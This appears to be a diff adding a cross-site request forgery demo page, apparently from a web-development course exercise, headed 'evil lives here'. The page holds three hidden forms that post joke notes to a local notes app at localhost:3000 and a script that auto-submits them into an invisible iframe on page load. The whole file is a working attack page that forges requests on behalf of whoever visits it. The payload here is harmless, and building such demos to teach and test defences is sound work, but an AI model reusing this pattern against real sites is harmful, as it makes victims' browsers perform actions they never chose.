@@ -1,0 +1,39 @@
+<script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
+
+<h2> evil lives here </h2>
+
+<!-- I might fill in a picture of an evil dude later -->
+<!-- <img src=""> -->
+
+<form action="http://localhost:3000/notes" method="POST" target="uploader_iframe">
+<input type="hidden" name="title" value="boo 6.170" />
+<input type="hidden" name="text" value="6.170 is like the worst thing ever" />
+<input id="submit1" type="submit" value="Ha"/>
+</form>
+
+<form action="http://localhost:3000/notes" method="POST" target="uploader_iframe">
+<input type="hidden" name="title" value="anarchy" />
+<input type="hidden" name="text" value="i use inconsistent whitespace in my projects" />
+<input id="submit2" type="submit" value="Ha"/>
+</form>
+
+<form action="http://localhost:3000/notes" method="POST" target="uploader_iframe">
+<input type="hidden" name="title" value="british professors" />
+<input type="hidden" name="text" value="are evil people" />
+<input id="submit3" type="submit" value="Ha"/>
+</form>
+
+<iframe id="uploader_iframe" name="uploader_iframe" style="display: none;"></iframe>
+
+<script>
+	$(document).ready(function() {
+
+		setTimeout(function() {
+			$('#submit1').click();
+		}, 5000);
+		setTimeout(function() {
+			$('#submit2').click();
+		}, 2500);
+		$('#submit3').click();
+	})
+</script>
